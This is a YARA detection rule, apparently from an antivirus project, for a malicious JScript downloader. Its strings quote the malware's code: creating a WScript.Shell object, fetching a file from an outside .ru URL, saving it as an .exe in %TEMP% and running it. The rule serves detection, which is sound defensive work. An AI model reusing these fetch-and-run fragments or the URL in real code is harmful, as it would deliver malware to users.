rule sig_20160401_8d9dc1d30a3fa504fd1e26dfeef95c3c {
  meta:
    description = "datamaliciousorder - file 20160401_8d9dc1d30a3fa504fd1e26dfeef95c3c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b393fa94605f8d44f478546ffb2fd1dad4372d8ae8584ebb3af051bfaa6745f8"

  strings:
    $s1  = "var BvxMn = function SvbTnj() {return WScript[ZmtXsb](\"WScript\"+\".Shell\");}(), TyhFuh = 11;" fullword ascii
    $s2  = "function ZjCyz(MtJx, BsrPqf){IczTze = IczTze * 1; return MtJx - BsrPqf;};" fullword ascii
    $s3  = "if (VesPk[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "VesPk[QdoJl](\"G\" + \"ET\", \"http://teamlight-pro.ru/j7esp\", false);" fullword ascii
    $s5  = "function NttEeq() {return BvxMn[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"enVbSS85ef.ex\" + \"e\";};" fullword ascii
    $s6  = "function MxEw(){return FfXey + \"\";};" fullword ascii
    $s7  = "function VyOn() {return ((BzyUr == true) && (BzyUr == DiTs)) ? 1 : IczTze;};" fullword ascii
    $s8  = "function QcJr()" fullword ascii
    $s9  = "var QxYtp = new this[\"Date\"]();" fullword ascii
    $s10 = "}while (LyoVp);" fullword ascii
    $s11 = "var BzyUr = false;" fullword ascii
    $s12 = "var DiTs = false;" fullword ascii
    $s13 = "BzyUr = true; " fullword ascii
    $s14 = "function ChhAt(ZbElj){BvxMn[\"R\"+\"un\"](ZbElj, IczTze, IczTze);};" fullword ascii
    $s15 = "var YpbYv = false;" fullword ascii
    $s16 = "function BiQts(HrJj) {var JaHn = (1, 2, 3, 4, 5, HrJj); return JaHn;};" fullword ascii
    $s17 = "DiTs = true; " fullword ascii
    $s18 = "function LpnHt(){return ZmtXsb;};" fullword ascii
    $s19 = "function WaqBz(){return 23;};" fullword ascii
    $s20 = "return ZjCyz(UyNi, LkNj);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}